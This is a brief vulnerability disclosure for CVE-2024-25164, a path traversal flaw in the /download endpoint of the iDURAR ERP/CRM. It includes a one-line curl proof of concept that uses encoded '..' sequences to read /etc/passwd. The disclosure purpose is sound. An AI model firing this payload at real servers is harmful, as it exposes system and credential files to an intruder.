## CVE-2024-25164

[iDURAR](https://idurarapp.com) is an online ERP/CRM software, built with nodejs.

iDURAR allows users to download files using `/download` endpoint, directory name and file name should be provided as parameters for the file to be downloaded. Due to lack of filtering in both parameters 
attackers can use malformed input to cause the application to read files outside of the directory intended by developers.

### PoC

`curl "http://localhost/download\..%2f..\..%2fetc%2fpasswd"`
